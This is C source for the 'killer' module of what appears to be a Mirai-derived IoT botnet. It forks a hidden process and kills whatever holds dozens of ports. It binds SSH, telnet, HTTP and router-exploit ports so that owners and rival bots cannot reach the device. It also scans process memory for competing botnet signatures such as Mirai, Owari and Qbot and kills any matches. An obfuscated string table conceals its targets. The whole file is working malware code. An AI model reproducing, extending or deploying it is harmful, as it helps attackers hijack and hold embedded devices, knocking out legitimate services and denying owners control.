#define _GNU_SOURCE

// dogshit killer

#ifdef DEMONS_KILLER
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>
#include <pwd.h>
#include <poll.h>
#include <sys/stat.h>

#include "headers/includes.h"
#include "headers/killer.h"
#include "headers/table.h"
#include "headers/util.h"

int killer_pid = 0;
char *killer_realpath;
int killer_realpath_len = 0;
int kill_counter = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL);
    uint32_t scan_counter = 0;

    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
        return;

    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    #ifdef DEBUG
        printf("[killer] starting...\n");
    #endif

    while(TRUE)
    {
        DIR *dir;
        struct dirent *file;
        killer_kill_by_port(htons(48101));
        killer_kill_by_port(htons(1991));
        killer_kill_by_port(htons(1338));
        killer_kill_by_port(htons(1982));
        killer_kill_by_port(htons(2048));
        killer_kill_by_port(htons(443));
        killer_kill_by_port(htons(4321));
        killer_kill_by_port(htons(6667));
        killer_kill_by_port(htons(6697));
        killer_kill_by_port(htons(33912));
        killer_kill_by_port(htons(16914));
        killer_kill_by_port(htons(4102));
        killer_kill_by_port(htons(34712));
        killer_kill_by_port(htons(1991));
        killer_kill_by_port(htons(9216));
        killer_kill_by_port(htons(18904));
        killer_kill_by_port(htons(1338));
        killer_kill_by_port(htons(1676));
        killer_kill_by_port(htons(36497));
        killer_kill_by_port(htons(666));
        killer_kill_by_port(htons(232));
        killer_kill_by_port(htons(1337));
        killer_kill_by_port(htons(34712));
        killer_kill_by_port(htons(420));
        killer_kill_by_port(htons(20397));
        killer_kill_by_port(htons(34712));
        killer_kill_by_port(htons(47564));
        killer_kill_by_port(htons(17012));
        killer_kill_by_port(htons(1982));
        killer_kill_by_port(htons(50643));
        killer_kill_by_port(htons(31337));
        killer_kill_by_port(htons(999));
        killer_kill_by_port(htons(69));
        killer_kill_by_port(htons(1212));
        killer_kill_by_port(htons(63887));
        killer_kill_by_port(htons(555));
        killer_kill_by_port(htons(444));
        killer_kill_by_port(htons(333));
        killer_kill_by_port(htons(222));
        killer_kill_by_port(htons(111));
        killer_kill_by_port(htons(9621));

        
    //////////////////////////////////
    struct sockaddr_in ssh_bind_addr;
    int ssh_bind_fd;
    ///////////////////////////////////
    struct sockaddr_in tel_bind_addr;
    int tel_bind_fd;
    ///////////////////////////////////
    struct sockaddr_in netis_bind_addr;
    int netis_bind_fd;
    ///////////////////////////////////
    struct sockaddr_in http_bind_addr;
    int http_bind_fd;
    ///////////////////////////////////
    struct sockaddr_in rt_bind_addr;
    int rt_bind_fd;
    ///////////////////////////////////
    struct sockaddr_in hw_bind_addr;
    int hw_bind_fd;
    ///////////////////////////////////
    struct sockaddr_in gpon8080_bind_addr;
    int gpon8080_bind_fd;
    ///////////////////////////////////
    struct sockaddr_in avtech_bind_addr;
    int avtech_bind_fd;

    ssh_bind_addr.sin_port = htons(22);
    tel_bind_addr.sin_port = htons(23);
    netis_bind_addr.sin_port = htons(53413);
    http_bind_addr.sin_port = htons(80);
    hw_bind_addr.sin_port = htons(37215);
    rt_bind_addr.sin_port = htons(52869);
    gpon8080_bind_addr.sin_port = htons(8080);
    avtech_bind_addr.sin_port = htons(8000);

    if ((ssh_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(ssh_bind_fd, (struct sockaddr *)&ssh_bind_addr, sizeof (struct sockaddr_in));
        listen(ssh_bind_fd, 1);
    }
    if (killer_kill_by_port(htons(23)) || killer_kill_by_port(htons(53413)) || killer_kill_by_port(htons(80)) || killer_kill_by_port(htons(52869)) || killer_kill_by_port(htons(37215)) || killer_kill_by_port(htons(8080)) || killer_kill_by_port(htons(8000)))
    {
        // N
    }
    if ((tel_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tel_bind_fd, (struct sockaddr *)&tel_bind_addr, sizeof (struct sockaddr_in));
        listen(tel_bind_fd, 1);
    }
    if ((netis_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(netis_bind_fd, (struct sockaddr *)&netis_bind_addr, sizeof (struct sockaddr_in));
        listen(netis_bind_fd, 1);
    }
    if ((http_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(http_bind_fd, (struct sockaddr *)&http_bind_addr, sizeof (struct sockaddr_in));
        listen(http_bind_fd, 1);
    }
    if ((rt_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(rt_bind_fd, (struct sockaddr *)&rt_bind_addr, sizeof (struct sockaddr_in));
        listen(rt_bind_fd, 1);
    }
    if ((hw_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(hw_bind_fd, (struct sockaddr *)&hw_bind_addr, sizeof (struct sockaddr_in));
        listen(hw_bind_fd, 1);
    }
    if ((gpon8080_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(gpon8080_bind_fd, (struct sockaddr *)&gpon8080_bind_addr, sizeof (struct sockaddr_in));
        listen(gpon8080_bind_fd, 1);
    }
    if ((avtech_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(avtech_bind_fd, (struct sockaddr *)&avtech_bind_addr, sizeof (struct sockaddr_in));
        listen(avtech_bind_fd, 1);
    }

    table_unlock_val(TABLE_KILLER_PROC);
    if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
    {
        #ifdef DEBUG
            printf("[killer] failed to open /proc!\n");
        #endif
        break;
    }
    table_lock_val(TABLE_KILLER_PROC);

        while((file = readdir(dir)) != NULL)
        {
            if(*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char maps_path[64], *ptr_maps_path = maps_path, realpath[PATH_MAX];
            int rp_len = 0, fd = 0, pid = util_atoi(file->d_name, 10);

            scan_counter++;
            if(pid <= killer_highest_pid)
            {
                if(time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    #ifdef DEBUG
                        printf("[killer] %d seconds have passed since last scan. re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
                    #endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if(pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }

            if(pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_MAPS);

            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_MAPS, NULL));

            #ifdef DEBUG
                printf("[killer] scanning path: %s\n", maps_path);
            #endif

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_MAPS);

            if(maps_scan_match(maps_path))
            {
                kill(pid, 9);
                kill_counter++;

                #ifdef DEBUG
                printf("[killer] killed: %s | total killed: %d\n", file->d_name, kill_counter);
                #endif
            }

            // Don't let others memory scan!!!
            util_zero(maps_path, sizeof(maps_path));

            sleep(1);
        }

        closedir(dir);
    }

    #ifdef DEBUG
        printf("[killer] finished\n");
    #endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    #ifdef DEBUG
        printf("[killer] finding and killing processes holding port %d\n", ntohs(port));
    #endif

    util_itoa(ntohs(port), 16, port_str);
    if(util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if(fd == -1)
        return 0;

    while(util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while(buffer[i] != 0 && buffer[i] != ':')
            i++;

        if(buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while(buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if(util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while(column_index < 7 && buffer[++i] != 0)
            {
                if(buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if(in_column == TRUE)
                        column_index++;

                    if(in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if(listening_state == FALSE)
                continue;

            while(buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if(util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }

    close(fd);

    if(util_strlen(inode) == 0)
    {
        #ifdef DEBUG
            printf("failed to find inode for port %d\n", ntohs(port));
        #endif

        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);

        return 0;
    }

    #ifdef DEBUG
        printf("found inode \"%s\" for port %d\n", inode, ntohs(port));
    #endif

    if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if(*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if(readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if((fd_dir = opendir(path)) != NULL)
            {
                while((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if(readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if(util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);

    return ret;
}

static BOOL maps_scan_match(char *path)
{
    char rdbuf[5000];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    char *m_mirai, *m_owari, *m_josho, *m_allqbot, *m_ogowari, *m_miraidlr, *m_miraiarm, *m_miraimips, *m_miraimpsl, *m_miraix86_64;
    int m_mirai_len, m_owari_len, m_josho_len, m_allqbot_len, m_ogowari_len, m_miraidlr_len, m_miraiarm_len, m_miraimips_len, m_miraimpsl_len, m_miraix86_64_len;
	
    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_EXEC_MIRAI);
    table_unlock_val(TABLE_EXEC_OWARI);
    table_unlock_val(TABLE_EXEC_JOSHO);
	table_unlock_val(TABLE_EXEC_ALLQBOT);
	table_unlock_val(TABLE_EXEC_OGOWARI);
    table_unlock_val(TABLE_EXEC_MIRAIDLR);
    table_unlock_val(TABLE_EXEC_MIRAIARM);
    table_unlock_val(TABLE_EXEC_MIRAIMIPS);
    table_unlock_val(TABLE_EXEC_MIRAIMPSL);
	table_unlock_val(TABLE_EXEC_X86_64);
	
    m_mirai = table_retrieve_val(TABLE_EXEC_MIRAI, &m_mirai_len);
    m_owari = table_retrieve_val(TABLE_EXEC_OWARI, &m_owari_len);
    m_josho = table_retrieve_val(TABLE_EXEC_JOSHO, &m_josho_len);
	m_allqbot = table_retrieve_val(TABLE_EXEC_ALLQBOT, &m_allqbot_len);
	m_ogowari = table_retrieve_val(TABLE_EXEC_OGOWARI, &m_ogowari_len);
    m_miraidlr = table_retrieve_val(TABLE_EXEC_MIRAIDLR, &m_miraidlr_len);
    m_miraiarm = table_retrieve_val(TABLE_EXEC_MIRAIARM, &m_miraiarm_len);
    m_miraimips = table_retrieve_val(TABLE_EXEC_MIRAIMIPS, &m_miraimips_len);
    m_miraimpsl = table_retrieve_val(TABLE_EXEC_MIRAIMPSL, &m_miraimpsl_len);
    m_miraix86_64 = table_retrieve_val(TABLE_EXEC_X86_64, &m_miraix86_64_len);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_mirai, m_mirai_len) ||
            mem_exists(rdbuf, ret, m_owari, m_owari_len) || 
		    mem_exists(rdbuf, ret, m_josho, m_josho_len) ||
			mem_exists(rdbuf, ret, m_allqbot, m_allqbot_len) ||
            mem_exists(rdbuf, ret, m_ogowari, m_ogowari_len) ||
			mem_exists(rdbuf, ret, m_miraidlr, m_miraidlr_len) ||
            mem_exists(rdbuf, ret, m_miraiarm, m_miraiarm_len) ||
            mem_exists(rdbuf, ret, m_miraimips, m_miraimips_len) ||
            mem_exists(rdbuf, ret, m_miraimpsl, m_miraimpsl_len) ||
            mem_exists(rdbuf, ret, m_miraix86_64, m_miraix86_64_len))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_EXEC_MIRAI);
    table_lock_val(TABLE_EXEC_OWARI);
    table_lock_val(TABLE_EXEC_JOSHO);
	table_lock_val(TABLE_EXEC_ALLQBOT);
	table_lock_val(TABLE_EXEC_OGOWARI);
    table_lock_val(TABLE_EXEC_MIRAIDLR);
    table_lock_val(TABLE_EXEC_MIRAIARM);
    table_lock_val(TABLE_EXEC_MIRAIMIPS);
    table_lock_val(TABLE_EXEC_MIRAIMPSL);
    table_lock_val(TABLE_EXEC_X86_64);
    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if(str_len > buf_len)
        return FALSE;

    while(buf_len--)
    {
        if(*buf++ == str[matches])
        {
            if(++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
#endif

